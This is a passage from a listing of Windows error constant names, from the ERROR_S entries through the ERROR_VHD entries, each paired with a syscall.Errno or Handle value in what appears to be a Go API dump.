ERROR_SMI_PRIMITIVE_INSTALLER_FAILED                                      syscall.Errno = 14108
ERROR_SMR_GARBAGE_COLLECTION_REQUIRED                                     syscall.Errno = 4445
ERROR_SOME_NOT_MAPPED                                                     syscall.Errno = 1301
ERROR_SOURCE_ELEMENT_EMPTY                                                syscall.Errno = 1160
ERROR_SPACES_ALLOCATION_SIZE_INVALID                                      Handle        = 0x80E7000E
ERROR_SPACES_DRIVE_OPERATIONAL_STATE_INVALID                              Handle        = 0x80E70012
ERROR_SPACES_DRIVE_REDUNDANCY_INVALID                                     Handle        = 0x80E70006
ERROR_SPACES_DRIVE_SECTOR_SIZE_INVALID                                    Handle        = 0x80E70004
ERROR_SPACES_ENCLOSURE_AWARE_INVALID                                      Handle        = 0x80E7000F
ERROR_SPACES_ENTRY_INCOMPLETE                                             Handle        = 0x80E70013
ERROR_SPACES_ENTRY_INVALID                                                Handle        = 0x80E70014
ERROR_SPACES_EXTENDED_ERROR                                               Handle        = 0x80E7000C
ERROR_SPACES_FAULT_DOMAIN_TYPE_INVALID                                    Handle        = 0x80E70001
ERROR_SPACES_INTERLEAVE_LENGTH_INVALID                                    Handle        = 0x80E70009
ERROR_SPACES_INTERNAL_ERROR                                               Handle        = 0x80E70002
ERROR_SPACES_NOT_ENOUGH_DRIVES                                            Handle        = 0x80E7000B
ERROR_SPACES_NUMBER_OF_COLUMNS_INVALID                                    Handle        = 0x80E7000A
ERROR_SPACES_NUMBER_OF_DATA_COPIES_INVALID                                Handle        = 0x80E70007
ERROR_SPACES_NUMBER_OF_GROUPS_INVALID                                     Handle        = 0x80E70011
ERROR_SPACES_PARITY_LAYOUT_INVALID                                        Handle        = 0x80E70008
ERROR_SPACES_POOL_WAS_DELETED                                             Handle        = 0x00E70001
ERROR_SPACES_PROVISIONING_TYPE_INVALID                                    Handle        = 0x80E7000D
ERROR_SPACES_RESILIENCY_TYPE_INVALID                                      Handle        = 0x80E70003
ERROR_SPACES_WRITE_CACHE_SIZE_INVALID                                     Handle        = 0x80E70010
ERROR_SPARSE_NOT_ALLOWED_IN_TRANSACTION                                   syscall.Errno = 6844
ERROR_SPECIAL_ACCOUNT                                                     syscall.Errno = 1371
ERROR_SPECIAL_GROUP                                                       syscall.Errno = 1372
ERROR_SPECIAL_USER                                                        syscall.Errno = 1373
ERROR_SPL_NO_ADDJOB                                                       syscall.Errno = 3004
ERROR_SPL_NO_STARTDOC                                                     syscall.Errno = 3003
ERROR_SPOOL_FILE_NOT_FOUND                                                syscall.Errno = 3002
ERROR_SRC_SRV_DLL_LOAD_FAILED                                             syscall.Errno = 428
ERROR_STACK_BUFFER_OVERRUN                                                syscall.Errno = 1282
ERROR_STACK_OVERFLOW                                                      syscall.Errno = 1001
ERROR_STACK_OVERFLOW_READ                                                 syscall.Errno = 599
ERROR_STATE_COMPOSITE_SETTING_VALUE_SIZE_LIMIT_EXCEEDED                   syscall.Errno = 15815
ERROR_STATE_CONTAINER_NAME_SIZE_LIMIT_EXCEEDED                            syscall.Errno = 15818
ERROR_STATE_CREATE_CONTAINER_FAILED                                       syscall.Errno = 15805
ERROR_STATE_DELETE_CONTAINER_FAILED                                       syscall.Errno = 15806
ERROR_STATE_DELETE_SETTING_FAILED                                         syscall.Errno = 15809
ERROR_STATE_ENUMERATE_CONTAINER_FAILED                                    syscall.Errno = 15813
ERROR_STATE_ENUMERATE_SETTINGS_FAILED                                     syscall.Errno = 15814
ERROR_STATE_GET_VERSION_FAILED                                            syscall.Errno = 15801
ERROR_STATE_LOAD_STORE_FAILED                                             syscall.Errno = 15800
ERROR_STATE_OPEN_CONTAINER_FAILED                                         syscall.Errno = 15804
ERROR_STATE_QUERY_SETTING_FAILED                                          syscall.Errno = 15810
ERROR_STATE_READ_COMPOSITE_SETTING_FAILED                                 syscall.Errno = 15811
ERROR_STATE_READ_SETTING_FAILED                                           syscall.Errno = 15807
ERROR_STATE_SETTING_NAME_SIZE_LIMIT_EXCEEDED                              syscall.Errno = 15817
ERROR_STATE_SETTING_VALUE_SIZE_LIMIT_EXCEEDED                             syscall.Errno = 15816
ERROR_STATE_SET_VERSION_FAILED                                            syscall.Errno = 15802
ERROR_STATE_STRUCTURED_RESET_FAILED                                       syscall.Errno = 15803
ERROR_STATE_WRITE_COMPOSITE_SETTING_FAILED                                syscall.Errno = 15812
ERROR_STATE_WRITE_SETTING_FAILED                                          syscall.Errno = 15808
ERROR_STATIC_INIT                                                         syscall.Errno = 4002
ERROR_STOPPED_ON_SYMLINK                                                  syscall.Errno = 681
ERROR_STORAGE_LOST_DATA_PERSISTENCE                                       syscall.Errno = 368
ERROR_STORAGE_RESERVE_ALREADY_EXISTS                                      syscall.Errno = 418
ERROR_STORAGE_RESERVE_DOES_NOT_EXIST                                      syscall.Errno = 417
ERROR_STORAGE_RESERVE_ID_INVALID                                          syscall.Errno = 416
ERROR_STORAGE_RESERVE_NOT_EMPTY                                           syscall.Errno = 419
ERROR_STORAGE_TOPOLOGY_ID_MISMATCH                                        syscall.Errno = 345
ERROR_STREAM_MINIVERSION_NOT_FOUND                                        syscall.Errno = 6808
ERROR_STREAM_MINIVERSION_NOT_VALID                                        syscall.Errno = 6809
ERROR_STRICT_CFG_VIOLATION                                                syscall.Errno = 1657
ERROR_SUBST_TO_JOIN                                                       syscall.Errno = 141
ERROR_SUBST_TO_SUBST                                                      syscall.Errno = 139
ERROR_SUCCESS                                                             syscall.Errno = 0
ERROR_SUCCESS_REBOOT_INITIATED                                            syscall.Errno = 1641
ERROR_SUCCESS_REBOOT_REQUIRED                                             syscall.Errno = 3010
ERROR_SUCCESS_RESTART_REQUIRED                                            syscall.Errno = 3011
ERROR_SVHDX_ERROR_NOT_AVAILABLE                                           Handle        = 0xC05CFF00
ERROR_SVHDX_ERROR_STORED                                                  Handle        = 0xC05C0000
ERROR_SVHDX_NO_INITIATOR                                                  Handle        = 0xC05CFF0B
ERROR_SVHDX_RESERVATION_CONFLICT                                          Handle        = 0xC05CFF07
ERROR_SVHDX_UNIT_ATTENTION_AVAILABLE                                      Handle        = 0xC05CFF01
ERROR_SVHDX_UNIT_ATTENTION_CAPACITY_DATA_CHANGED                          Handle        = 0xC05CFF02
ERROR_SVHDX_UNIT_ATTENTION_OPERATING_DEFINITION_CHANGED                   Handle        = 0xC05CFF06
ERROR_SVHDX_UNIT_ATTENTION_REGISTRATIONS_PREEMPTED                        Handle        = 0xC05CFF05
ERROR_SVHDX_UNIT_ATTENTION_RESERVATIONS_PREEMPTED                         Handle        = 0xC05CFF03
ERROR_SVHDX_UNIT_ATTENTION_RESERVATIONS_RELEASED                          Handle        = 0xC05CFF04
ERROR_SVHDX_VERSION_MISMATCH                                              Handle        = 0xC05CFF09
ERROR_SVHDX_WRONG_FILE_TYPE                                               Handle        = 0xC05CFF08
ERROR_SWAPERROR                                                           syscall.Errno = 999
ERROR_SXS_ACTIVATION_CONTEXT_DISABLED                                     syscall.Errno = 14006
ERROR_SXS_ASSEMBLY_IS_NOT_A_DEPLOYMENT                                    syscall.Errno = 14103
ERROR_SXS_ASSEMBLY_MISSING                                                syscall.Errno = 14081
ERROR_SXS_ASSEMBLY_NOT_FOUND                                              syscall.Errno = 14003
ERROR_SXS_ASSEMBLY_NOT_LOCKED                                             syscall.Errno = 14097
ERROR_SXS_CANT_GEN_ACTCTX                                                 syscall.Errno = 14001
ERROR_SXS_COMPONENT_STORE_CORRUPT                                         syscall.Errno = 14098
ERROR_SXS_CORRUPTION                                                      syscall.Errno = 14083
ERROR_SXS_CORRUPT_ACTIVATION_STACK                                        syscall.Errno = 14082
ERROR_SXS_DUPLICATE_ACTIVATABLE_CLASS                                     syscall.Errno = 14111
ERROR_SXS_DUPLICATE_ASSEMBLY_NAME                                         syscall.Errno = 14027
ERROR_SXS_DUPLICATE_CLSID                                                 syscall.Errno = 14023
ERROR_SXS_DUPLICATE_DLL_NAME                                              syscall.Errno = 14021
ERROR_SXS_DUPLICATE_IID                                                   syscall.Errno = 14024
ERROR_SXS_DUPLICATE_PROGID                                                syscall.Errno = 14026
ERROR_SXS_DUPLICATE_TLBID                                                 syscall.Errno = 14025
ERROR_SXS_DUPLICATE_WINDOWCLASS_NAME                                      syscall.Errno = 14022
ERROR_SXS_EARLY_DEACTIVATION                                              syscall.Errno = 14084
ERROR_SXS_FILE_HASH_MISMATCH                                              syscall.Errno = 14028
ERROR_SXS_FILE_HASH_MISSING                                               syscall.Errno = 14110
ERROR_SXS_FILE_NOT_PART_OF_ASSEMBLY                                       syscall.Errno = 14104
ERROR_SXS_IDENTITIES_DIFFERENT                                            syscall.Errno = 14102
ERROR_SXS_IDENTITY_DUPLICATE_ATTRIBUTE                                    syscall.Errno = 14092
ERROR_SXS_IDENTITY_PARSE_ERROR                                            syscall.Errno = 14093
ERROR_SXS_INCORRECT_PUBLIC_KEY_TOKEN                                      syscall.Errno = 14095
ERROR_SXS_INVALID_ACTCTXDATA_FORMAT                                       syscall.Errno = 14002
ERROR_SXS_INVALID_ASSEMBLY_IDENTITY_ATTRIBUTE                             syscall.Errno = 14017
ERROR_SXS_INVALID_ASSEMBLY_IDENTITY_ATTRIBUTE_NAME                        syscall.Errno = 14080
ERROR_SXS_INVALID_DEACTIVATION                                            syscall.Errno = 14085
ERROR_SXS_INVALID_IDENTITY_ATTRIBUTE_NAME                                 syscall.Errno = 14091
ERROR_SXS_INVALID_IDENTITY_ATTRIBUTE_VALUE                                syscall.Errno = 14090
ERROR_SXS_INVALID_XML_NAMESPACE_URI                                       syscall.Errno = 14014
ERROR_SXS_KEY_NOT_FOUND                                                   syscall.Errno = 14007
ERROR_SXS_LEAF_MANIFEST_DEPENDENCY_NOT_INSTALLED                          syscall.Errno = 14016
ERROR_SXS_MANIFEST_FORMAT_ERROR                                           syscall.Errno = 14004
ERROR_SXS_MANIFEST_IDENTITY_SAME_BUT_CONTENTS_DIFFERENT                   syscall.Errno = 14101
ERROR_SXS_MANIFEST_INVALID_REQUIRED_DEFAULT_NAMESPACE                     syscall.Errno = 14019
ERROR_SXS_MANIFEST_MISSING_REQUIRED_DEFAULT_NAMESPACE                     syscall.Errno = 14018
ERROR_SXS_MANIFEST_PARSE_ERROR                                            syscall.Errno = 14005
ERROR_SXS_MANIFEST_TOO_BIG                                                syscall.Errno = 14105
ERROR_SXS_MISSING_ASSEMBLY_IDENTITY_ATTRIBUTE                             syscall.Errno = 14079
ERROR_SXS_MULTIPLE_DEACTIVATION                                           syscall.Errno = 14086
ERROR_SXS_POLICY_PARSE_ERROR                                              syscall.Errno = 14029
ERROR_SXS_PRIVATE_MANIFEST_CROSS_PATH_WITH_REPARSE_POINT                  syscall.Errno = 14020
ERROR_SXS_PROCESS_DEFAULT_ALREADY_SET                                     syscall.Errno = 14011
ERROR_SXS_PROCESS_TERMINATION_REQUESTED                                   syscall.Errno = 14087
ERROR_SXS_PROTECTION_CATALOG_FILE_MISSING                                 syscall.Errno = 14078
ERROR_SXS_PROTECTION_CATALOG_NOT_VALID                                    syscall.Errno = 14076
ERROR_SXS_PROTECTION_PUBLIC_KEY_TOO_SHORT                                 syscall.Errno = 14075
ERROR_SXS_PROTECTION_RECOVERY_FAILED                                      syscall.Errno = 14074
ERROR_SXS_RELEASE_ACTIVATION_CONTEXT                                      syscall.Errno = 14088
ERROR_SXS_ROOT_MANIFEST_DEPENDENCY_NOT_INSTALLED                          syscall.Errno = 14015
ERROR_SXS_SECTION_NOT_FOUND                                               syscall.Errno = 14000
ERROR_SXS_SETTING_NOT_REGISTERED                                          syscall.Errno = 14106
ERROR_SXS_SYSTEM_DEFAULT_ACTIVATION_CONTEXT_EMPTY                         syscall.Errno = 14089
ERROR_SXS_THREAD_QUERIES_DISABLED                                         syscall.Errno = 14010
ERROR_SXS_TRANSACTION_CLOSURE_INCOMPLETE                                  syscall.Errno = 14107
ERROR_SXS_UNKNOWN_ENCODING                                                syscall.Errno = 14013
ERROR_SXS_UNKNOWN_ENCODING_GROUP                                          syscall.Errno = 14012
ERROR_SXS_UNTRANSLATABLE_HRESULT                                          syscall.Errno = 14077
ERROR_SXS_VERSION_CONFLICT                                                syscall.Errno = 14008
ERROR_SXS_WRONG_SECTION_TYPE                                              syscall.Errno = 14009
ERROR_SXS_XML_E_BADCHARDATA                                               syscall.Errno = 14036
ERROR_SXS_XML_E_BADCHARINSTRING                                           syscall.Errno = 14034
ERROR_SXS_XML_E_BADNAMECHAR                                               syscall.Errno = 14033
ERROR_SXS_XML_E_BADPEREFINSUBSET                                          syscall.Errno = 14059
ERROR_SXS_XML_E_BADSTARTNAMECHAR                                          syscall.Errno = 14032
ERROR_SXS_XML_E_BADXMLCASE                                                syscall.Errno = 14069
ERROR_SXS_XML_E_BADXMLDECL                                                syscall.Errno = 14056
ERROR_SXS_XML_E_COMMENTSYNTAX                                             syscall.Errno = 14031
ERROR_SXS_XML_E_DUPLICATEATTRIBUTE                                        syscall.Errno = 14053
ERROR_SXS_XML_E_EXPECTINGCLOSEQUOTE                                       syscall.Errno = 14045
ERROR_SXS_XML_E_EXPECTINGTAGEND                                           syscall.Errno = 14038
ERROR_SXS_XML_E_INCOMPLETE_ENCODING                                       syscall.Errno = 14043
ERROR_SXS_XML_E_INTERNALERROR                                             syscall.Errno = 14041
ERROR_SXS_XML_E_INVALIDATROOTLEVEL                                        syscall.Errno = 14055
ERROR_SXS_XML_E_INVALIDENCODING                                           syscall.Errno = 14067
ERROR_SXS_XML_E_INVALIDSWITCH                                             syscall.Errno = 14068
ERROR_SXS_XML_E_INVALID_DECIMAL                                           syscall.Errno = 14047
ERROR_SXS_XML_E_INVALID_HEXIDECIMAL                                       syscall.Errno = 14048
ERROR_SXS_XML_E_INVALID_STANDALONE                                        syscall.Errno = 14070
ERROR_SXS_XML_E_INVALID_UNICODE                                           syscall.Errno = 14049
ERROR_SXS_XML_E_INVALID_VERSION                                           syscall.Errno = 14072
ERROR_SXS_XML_E_MISSINGEQUALS                                             syscall.Errno = 14073
ERROR_SXS_XML_E_MISSINGQUOTE                                              syscall.Errno = 14030
ERROR_SXS_XML_E_MISSINGROOT                                               syscall.Errno = 14057
ERROR_SXS_XML_E_MISSINGSEMICOLON                                          syscall.Errno = 14039
ERROR_SXS_XML_E_MISSINGWHITESPACE                                         syscall.Errno = 14037
ERROR_SXS_XML_E_MISSING_PAREN                                             syscall.Errno = 14044
ERROR_SXS_XML_E_MULTIPLEROOTS                                             syscall.Errno = 14054
ERROR_SXS_XML_E_MULTIPLE_COLONS                                           syscall.Errno = 14046
ERROR_SXS_XML_E_RESERVEDNAMESPACE                                         syscall.Errno = 14066
ERROR_SXS_XML_E_UNBALANCEDPAREN                                           syscall.Errno = 14040
ERROR_SXS_XML_E_UNCLOSEDCDATA                                             syscall.Errno = 14065
ERROR_SXS_XML_E_UNCLOSEDCOMMENT                                           syscall.Errno = 14063
ERROR_SXS_XML_E_UNCLOSEDDECL                                              syscall.Errno = 14064
ERROR_SXS_XML_E_UNCLOSEDENDTAG                                            syscall.Errno = 14061
ERROR_SXS_XML_E_UNCLOSEDSTARTTAG                                          syscall.Errno = 14060
ERROR_SXS_XML_E_UNCLOSEDSTRING                                            syscall.Errno = 14062
ERROR_SXS_XML_E_UNCLOSEDTAG                                               syscall.Errno = 14052
ERROR_SXS_XML_E_UNEXPECTEDENDTAG                                          syscall.Errno = 14051
ERROR_SXS_XML_E_UNEXPECTEDEOF                                             syscall.Errno = 14058
ERROR_SXS_XML_E_UNEXPECTED_STANDALONE                                     syscall.Errno = 14071
ERROR_SXS_XML_E_UNEXPECTED_WHITESPACE                                     syscall.Errno = 14042
ERROR_SXS_XML_E_WHITESPACEORQUESTIONMARK                                  syscall.Errno = 14050
ERROR_SXS_XML_E_XMLDECLSYNTAX                                             syscall.Errno = 14035
ERROR_SYMLINK_CLASS_DISABLED                                              syscall.Errno = 1463
ERROR_SYMLINK_NOT_SUPPORTED                                               syscall.Errno = 1464
ERROR_SYNCHRONIZATION_REQUIRED                                            syscall.Errno = 569
ERROR_SYNC_FOREGROUND_REFRESH_REQUIRED                                    syscall.Errno = 1274
ERROR_SYSTEM_DEVICE_NOT_FOUND                                             syscall.Errno = 15299
ERROR_SYSTEM_HIVE_TOO_LARGE                                               syscall.Errno = 653
ERROR_SYSTEM_IMAGE_BAD_SIGNATURE                                          syscall.Errno = 637
ERROR_SYSTEM_INTEGRITY_INVALID_POLICY                                     syscall.Errno = 4552
ERROR_SYSTEM_INTEGRITY_POLICY_NOT_SIGNED                                  syscall.Errno = 4553
ERROR_SYSTEM_INTEGRITY_POLICY_VIOLATION                                   syscall.Errno = 4551
ERROR_SYSTEM_INTEGRITY_ROLLBACK_DETECTED                                  syscall.Errno = 4550
ERROR_SYSTEM_INTEGRITY_SUPPLEMENTAL_POLICY_NOT_AUTHORIZED                 syscall.Errno = 4555
ERROR_SYSTEM_INTEGRITY_TOO_MANY_POLICIES                                  syscall.Errno = 4554
ERROR_SYSTEM_NEEDS_REMEDIATION                                            syscall.Errno = 15623
ERROR_SYSTEM_POWERSTATE_COMPLEX_TRANSITION                                syscall.Errno = 783
ERROR_SYSTEM_POWERSTATE_TRANSITION                                        syscall.Errno = 782
ERROR_SYSTEM_PROCESS_TERMINATED                                           syscall.Errno = 591
ERROR_SYSTEM_SHUTDOWN                                                     syscall.Errno = 641
ERROR_SYSTEM_TRACE                                                        syscall.Errno = 150
ERROR_TAG_NOT_FOUND                                                       syscall.Errno = 2012
ERROR_TAG_NOT_PRESENT                                                     syscall.Errno = 2013
ERROR_THREAD_1_INACTIVE                                                   syscall.Errno = 210
ERROR_THREAD_ALREADY_IN_TASK                                              syscall.Errno = 1552
ERROR_THREAD_MODE_ALREADY_BACKGROUND                                      syscall.Errno = 400
ERROR_THREAD_MODE_NOT_BACKGROUND                                          syscall.Errno = 401
ERROR_THREAD_NOT_IN_PROCESS                                               syscall.Errno = 566
ERROR_THREAD_WAS_SUSPENDED                                                syscall.Errno = 699
ERROR_TIERING_ALREADY_PROCESSING                                          Handle        = 0x80830006
ERROR_TIERING_CANNOT_PIN_OBJECT                                           Handle        = 0x80830007
ERROR_TIERING_FILE_IS_NOT_PINNED                                          Handle        = 0x80830008
ERROR_TIERING_INVALID_FILE_ID                                             Handle        = 0x80830004
ERROR_TIERING_NOT_SUPPORTED_ON_VOLUME                                     Handle        = 0x80830001
ERROR_TIERING_STORAGE_TIER_NOT_FOUND                                      Handle        = 0x80830003
ERROR_TIERING_VOLUME_DISMOUNT_IN_PROGRESS                                 Handle        = 0x80830002
ERROR_TIERING_WRONG_CLUSTER_NODE                                          Handle        = 0x80830005
ERROR_TIMEOUT                                                             syscall.Errno = 1460
ERROR_TIMER_NOT_CANCELED                                                  syscall.Errno = 541
ERROR_TIMER_RESOLUTION_NOT_SET                                            syscall.Errno = 607
ERROR_TIMER_RESUME_IGNORED                                                syscall.Errno = 722
ERROR_TIME_SENSITIVE_THREAD                                               syscall.Errno = 422
ERROR_TIME_SKEW                                                           syscall.Errno = 1398
ERROR_TLW_WITH_WSCHILD                                                    syscall.Errno = 1406
ERROR_TM_IDENTITY_MISMATCH                                                syscall.Errno = 6845
ERROR_TM_INITIALIZATION_FAILED                                            syscall.Errno = 6706
ERROR_TM_VOLATILE                                                         syscall.Errno = 6828
ERROR_TOKEN_ALREADY_IN_USE                                                syscall.Errno = 1375
ERROR_TOO_MANY_CMDS                                                       syscall.Errno = 56
ERROR_TOO_MANY_CONTEXT_IDS                                                syscall.Errno = 1384
ERROR_TOO_MANY_DESCRIPTORS                                                syscall.Errno = 331
ERROR_TOO_MANY_LINKS                                                      syscall.Errno = 1142
ERROR_TOO_MANY_LUIDS_REQUESTED                                            syscall.Errno = 1333
ERROR_TOO_MANY_MODULES                                                    syscall.Errno = 214
ERROR_TOO_MANY_MUXWAITERS                                                 syscall.Errno = 152
ERROR_TOO_MANY_NAMES                                                      syscall.Errno = 68
ERROR_TOO_MANY_OPEN_FILES                                                 syscall.Errno = 4
ERROR_TOO_MANY_POSTS                                                      syscall.Errno = 298
ERROR_TOO_MANY_SECRETS                                                    syscall.Errno = 1381
ERROR_TOO_MANY_SEMAPHORES                                                 syscall.Errno = 100
ERROR_TOO_MANY_SEM_REQUESTS                                               syscall.Errno = 103
ERROR_TOO_MANY_SESS                                                       syscall.Errno = 69
ERROR_TOO_MANY_SIDS                                                       syscall.Errno = 1389
ERROR_TOO_MANY_TCBS                                                       syscall.Errno = 155
ERROR_TOO_MANY_THREADS                                                    syscall.Errno = 565
ERROR_TRANSACTED_MAPPING_UNSUPPORTED_REMOTE                               syscall.Errno = 6834
ERROR_TRANSACTIONAL_CONFLICT                                              syscall.Errno = 6800
ERROR_TRANSACTIONAL_OPEN_NOT_ALLOWED                                      syscall.Errno = 6832
ERROR_TRANSACTIONMANAGER_IDENTITY_MISMATCH                                syscall.Errno = 6727
ERROR_TRANSACTIONMANAGER_NOT_FOUND                                        syscall.Errno = 6718
ERROR_TRANSACTIONMANAGER_NOT_ONLINE                                       syscall.Errno = 6719
ERROR_TRANSACTIONMANAGER_RECOVERY_NAME_COLLISION                          syscall.Errno = 6720
ERROR_TRANSACTIONS_NOT_FROZEN                                             syscall.Errno = 6839
ERROR_TRANSACTIONS_UNSUPPORTED_REMOTE                                     syscall.Errno = 6805
ERROR_TRANSACTION_ALREADY_ABORTED                                         syscall.Errno = 6704
ERROR_TRANSACTION_ALREADY_COMMITTED                                       syscall.Errno = 6705
ERROR_TRANSACTION_FREEZE_IN_PROGRESS                                      syscall.Errno = 6840
ERROR_TRANSACTION_INTEGRITY_VIOLATED                                      syscall.Errno = 6726
ERROR_TRANSACTION_INVALID_MARSHALL_BUFFER                                 syscall.Errno = 6713
ERROR_TRANSACTION_MUST_WRITETHROUGH                                       syscall.Errno = 6729
ERROR_TRANSACTION_NOT_ACTIVE                                              syscall.Errno = 6701
ERROR_TRANSACTION_NOT_ENLISTED                                            syscall.Errno = 6855
ERROR_TRANSACTION_NOT_FOUND                                               syscall.Errno = 6715
ERROR_TRANSACTION_NOT_JOINED                                              syscall.Errno = 6708
ERROR_TRANSACTION_NOT_REQUESTED                                           syscall.Errno = 6703
ERROR_TRANSACTION_NOT_ROOT                                                syscall.Errno = 6721
ERROR_TRANSACTION_NO_SUPERIOR                                             syscall.Errno = 6730
ERROR_TRANSACTION_OBJECT_EXPIRED                                          syscall.Errno = 6722
ERROR_TRANSACTION_PROPAGATION_FAILED                                      syscall.Errno = 6711
ERROR_TRANSACTION_RECORD_TOO_LONG                                         syscall.Errno = 6724
ERROR_TRANSACTION_REQUEST_NOT_VALID                                       syscall.Errno = 6702
ERROR_TRANSACTION_REQUIRED_PROMOTION                                      syscall.Errno = 6837
ERROR_TRANSACTION_RESPONSE_NOT_ENLISTED                                   syscall.Errno = 6723
ERROR_TRANSACTION_SCOPE_CALLBACKS_NOT_SET                                 syscall.Errno = 6836
ERROR_TRANSACTION_SUPERIOR_EXISTS                                         syscall.Errno = 6709
ERROR_TRANSFORM_NOT_SUPPORTED                                             syscall.Errno = 2004
ERROR_TRANSLATION_COMPLETE                                                syscall.Errno = 757
ERROR_TRANSPORT_FULL                                                      syscall.Errno = 4328
ERROR_TRUSTED_DOMAIN_FAILURE                                              syscall.Errno = 1788
ERROR_TRUSTED_RELATIONSHIP_FAILURE                                        syscall.Errno = 1789
ERROR_TRUST_FAILURE                                                       syscall.Errno = 1790
ERROR_TS_INCOMPATIBLE_SESSIONS                                            syscall.Errno = 7069
ERROR_TS_VIDEO_SUBSYSTEM_ERROR                                            syscall.Errno = 7070
ERROR_TXF_ATTRIBUTE_CORRUPT                                               syscall.Errno = 6830
ERROR_TXF_DIR_NOT_EMPTY                                                   syscall.Errno = 6826
ERROR_TXF_METADATA_ALREADY_PRESENT                                        syscall.Errno = 6835
ERROR_UNABLE_TO_CLEAN                                                     syscall.Errno = 4311
ERROR_UNABLE_TO_EJECT_MOUNTED_MEDIA                                       syscall.Errno = 4330
ERROR_UNABLE_TO_INVENTORY_DRIVE                                           syscall.Errno = 4325
ERROR_UNABLE_TO_INVENTORY_SLOT                                            syscall.Errno = 4326
ERROR_UNABLE_TO_INVENTORY_TRANSPORT                                       syscall.Errno = 4327
ERROR_UNABLE_TO_LOAD_MEDIUM                                               syscall.Errno = 4324
ERROR_UNABLE_TO_LOCK_MEDIA                                                syscall.Errno = 1108
ERROR_UNABLE_TO_MOVE_REPLACEMENT                                          syscall.Errno = 1176
ERROR_UNABLE_TO_MOVE_REPLACEMENT_2                                        syscall.Errno = 1177
ERROR_UNABLE_TO_REMOVE_REPLACED                                           syscall.Errno = 1175
ERROR_UNABLE_TO_UNLOAD_MEDIA                                              syscall.Errno = 1109
ERROR_UNDEFINED_CHARACTER                                                 syscall.Errno = 583
ERROR_UNDEFINED_SCOPE                                                     syscall.Errno = 319
ERROR_UNEXPECTED_MM_CREATE_ERR                                            syscall.Errno = 556
ERROR_UNEXPECTED_MM_EXTEND_ERR                                            syscall.Errno = 558
ERROR_UNEXPECTED_MM_MAP_ERROR                                             syscall.Errno = 557
ERROR_UNEXPECTED_OMID                                                     syscall.Errno = 4334
ERROR_UNEXP_NET_ERR                                                       syscall.Errno = 59
ERROR_UNHANDLED_EXCEPTION                                                 syscall.Errno = 574
ERROR_UNIDENTIFIED_ERROR                                                  syscall.Errno = 1287
ERROR_UNKNOWN_COMPONENT                                                   syscall.Errno = 1607
ERROR_UNKNOWN_EXCEPTION                      Errno = 0x20000000 
ERROR_UNKNOWN_FEATURE                                                     syscall.Errno = 1606
ERROR_UNKNOWN_PATCH                                                       syscall.Errno = 1647
ERROR_UNKNOWN_PORT                                                        syscall.Errno = 1796
ERROR_UNKNOWN_PRINTER_DRIVER                                              syscall.Errno = 1797
ERROR_UNKNOWN_PRINTPROCESSOR                                              syscall.Errno = 1798
ERROR_UNKNOWN_PRINT_MONITOR                                               syscall.Errno = 3000
ERROR_UNKNOWN_PRODUCT                                                     syscall.Errno = 1605
ERROR_UNKNOWN_PROPERTY                                                    syscall.Errno = 1608
ERROR_UNKNOWN_REVISION                                                    syscall.Errno = 1305
ERROR_UNMAPPED_SUBSTITUTION_STRING                                        syscall.Errno = 14096
ERROR_UNRECOGNIZED_MEDIA                                                  syscall.Errno = 1785
ERROR_UNRECOGNIZED_VOLUME                                                 syscall.Errno = 1005
ERROR_UNRECOVERABLE_STACK_OVERFLOW           Errno = 0x20000000 
ERROR_UNSUPPORTED_COMPRESSION                                             syscall.Errno = 618
ERROR_UNSUPPORTED_TYPE                                                    syscall.Errno = 1630
ERROR_UNWIND                                                              syscall.Errno = 542
ERROR_UNWIND_CONSOLIDATE                                                  syscall.Errno = 684
ERROR_USER_APC                                                            syscall.Errno = 737
ERROR_USER_DELETE_TRUST_QUOTA_EXCEEDED                                    syscall.Errno = 1934
ERROR_USER_EXISTS                                                         syscall.Errno = 1316
ERROR_USER_MAPPED_FILE                                                    syscall.Errno = 1224
ERROR_USER_PROFILE_LOAD                                                   syscall.Errno = 500
ERROR_VALIDATE_CONTINUE                                                   syscall.Errno = 625
ERROR_VC_DISCONNECTED                                                     syscall.Errno = 240
ERROR_VDM_DISALLOWED                                                      syscall.Errno = 1286
ERROR_VDM_HARD_ERROR                                                      syscall.Errno = 593
ERROR_VERIFIER_STOP                                                       syscall.Errno = 537
ERROR_VERSION_PARSE_ERROR                                                 syscall.Errno = 777
ERROR_VHDSET_BACKING_STORAGE_NOT_FOUND                                    Handle        = 0xC05CFF0C
ERROR_VHD_ALREADY_AT_OR_BELOW_MINIMUM_VIRTUAL_SIZE                        syscall.Errno = 0xC03A0027
ERROR_VHD_BITMAP_MISMATCH                                                 syscall.Errno = 0xC03A000C
ERROR_VHD_BLOCK_ALLOCATION_FAILURE                                        syscall.Errno = 0xC03A0009
ERROR_VHD_BLOCK_ALLOCATION_TABLE_CORRUPT                                  syscall.Errno = 0xC03A000A
ERROR_VHD_CHANGE_TRACKING_DISABLED                                        syscall.Errno = 0xC03A002A
ERROR_VHD_CHILD_PARENT_ID_MISMATCH                                        syscall.Errno = 0xC03A000E
ERROR_VHD_CHILD_PARENT_SIZE_MISMATCH                                      syscall.Errno = 0xC03A0017
ERROR_VHD_CHILD_PARENT_TIMESTAMP_MISMATCH                                 syscall.Errno = 0xC03A000F
ERROR_VHD_COULD_NOT_COMPUTE_MINIMUM_VIRTUAL_SIZE                          syscall.Errno = 0xC03A0026
ERROR_VHD_DIFFERENCING_CHAIN_CYCLE_DETECTED                               syscall.Errno = 0xC03A0018
ERROR_VHD_DIFFERENCING_CHAIN_ERROR_IN_PARENT                              syscall.Errno = 0xC03A0019
ERROR_VHD_DRIVE_FOOTER_CHECKSUM_MISMATCH                                  syscall.Errno = 0xC03A0002
ERROR_VHD_DRIVE_FOOTER_CORRUPT                                            syscall.Errno = 0xC03A0003
ERROR_VHD_DRIVE_FOOTER_MISSING                                            syscall.Errno = 0xC03A0001
ERROR_VHD_FORMAT_UNKNOWN                                                  syscall.Errno = 0xC03A0004
ERROR_VHD_FORMAT_UNSUPPORTED_VERSION                                      syscall.Errno = 0xC03A0005
ERROR_VHD_INVALID_BLOCK_SIZE                                              syscall.Errno = 0xC03A000B
ERROR_VHD_INVALID_CHANGE_TRACKING_ID                                      syscall.Errno = 0xC03A0029
ERROR_VHD_INVALID_FILE_SIZE                                               syscall.Errno = 0xC03A0013
ERROR_VHD_INVALID_SIZE                                                    syscall.Errno = 0xC03A0012
ERROR_VHD_INVALID_STATE                                                   syscall.Errno = 0xC03A001C
ERROR_VHD_INVALID_TYPE                                                    syscall.Errno = 0xC03A001B
ERROR_VHD_METADATA_FULL                                                   syscall.Errno = 0xC03A0028
ERROR_VHD_METADATA_READ_FAILURE                                           syscall.Errno = 0xC03A0010
